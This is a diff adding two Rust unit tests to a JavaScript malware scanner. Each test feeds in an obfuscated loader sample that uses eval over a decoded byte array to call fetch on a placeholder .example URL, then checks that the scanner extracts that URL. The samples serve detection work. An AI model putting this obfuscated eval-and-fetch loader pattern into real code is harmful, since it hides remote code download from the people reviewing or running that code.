@@ -10389,6 +10389,56 @@ mod js_url_extraction_tests {
     }
 
     #[test]
+    fn js_new_buffer_byte_array_payload_url_extracted() {
+        let mut env = Environment::new(&Config::default());
+        let payload = "fetch('https://new-buffer-byte-array-js.example/p')";
+        let bytes = payload
+            .as_bytes()
+            .iter()
+            .map(u8::to_string)
+            .collect::<Vec<_>>()
+            .join(",");
+        let js = format!(r#"eval(new Buffer([{bytes}]).toString())"#).into_bytes();
+        env.all_extracted_jscript.push(js);
+        crate::js_scan::scan_js_payloads(&mut env);
+        let has = env.traits.iter().any(|t| {
+            matches!(t,
+                Trait::Download { src, .. } if src == "https://new-buffer-byte-array-js.example/p"
+            )
+        });
+        assert!(
+            has,
+            "JS new Buffer byte array payload URL missed: {:?}",
+            env.traits
+        );
+    }
+
+    #[test]
+    fn js_new_buffer_bound_byte_array_payload_url_extracted() {
+        let mut env = Environment::new(&Config::default());
+        let payload = "fetch('https://new-buffer-bound-byte-array-js.example/p')";
+        let bytes = payload
+            .as_bytes()
+            .iter()
+            .map(u8::to_string)
+            .collect::<Vec<_>>()
+            .join(",");
+        let js = format!(r#"var a = [{bytes}]; eval(new Buffer(a).toString())"#).into_bytes();
+        env.all_extracted_jscript.push(js);
+        crate::js_scan::scan_js_payloads(&mut env);
+        let has = env.traits.iter().any(|t| {
+            matches!(t,
+                Trait::Download { src, .. } if src == "https://new-buffer-bound-byte-array-js.example/p"
+            )
+        });
+        assert!(
+            has,
+            "JS new Buffer bound byte array payload URL missed: {:?}",
+            env.traits
+        );
+    }
+
+    #[test]
     fn js_buffer_from_base64url_payload_url_extracted() {
         let mut env = Environment::new(&Config::default());
         let encoded = base64::Engine::encode(
